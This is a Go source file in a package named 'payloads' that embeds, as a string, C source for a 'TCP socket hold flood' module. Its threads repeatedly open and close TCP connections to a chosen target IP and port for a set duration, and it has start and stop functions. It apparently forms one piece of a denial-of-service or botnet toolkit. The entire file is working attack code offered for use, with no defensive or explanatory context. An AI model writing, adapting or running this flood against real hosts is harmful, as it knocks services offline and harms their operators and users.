package payloads

var TCPSocketHold = `
// ==================== TCP SOCKET HOLD FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <fcntl.h>

static int socket_hold_running = 0;
static pthread_t socket_hold_threads[100];

void *socket_hold_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int duration = *(int *)((char *)arg + 68);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    int keepAlive = 1;
    time_t start = time(NULL);
    
    while (socket_hold_running && time(NULL) - start < duration) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;
        
        setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &keepAlive, sizeof(keepAlive));
        connect(fd, (struct sockaddr *)&sin, sizeof(sin));
        usleep(100000);
        close(fd);
    }
    
    return NULL;
}

void start_socket_hold_attack(char *target, int port, int threads, int duration_sec) {
    if (socket_hold_running) return;
    socket_hold_running = 1;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = duration_sec;
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&socket_hold_threads[i], NULL, socket_hold_flood, arg);
    }
    
    sleep(duration_sec);
    socket_hold_running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(socket_hold_threads[i], NULL);
    }
    free(arg);
}

void stop_socket_hold_attack() { socket_hold_running = 0; }
// ==================== END TCP SOCKET HOLD MODULE ====================
`